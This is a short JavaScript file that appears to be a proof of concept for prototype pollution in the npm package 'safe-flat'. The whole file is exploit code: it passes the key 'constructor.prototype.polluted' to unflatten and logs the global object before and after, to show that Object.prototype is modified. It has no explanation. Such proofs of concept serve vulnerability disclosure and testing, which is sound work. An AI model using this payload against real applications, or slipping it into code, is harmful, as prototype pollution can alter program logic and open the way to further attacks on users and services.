var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var safeFlat = require('safe-flat');
obj = {};
console.log({}.polluted);
safeFlat.unflatten({ 'constructor.prototype.polluted': 'yes' }, '.');
console.log({}.polluted);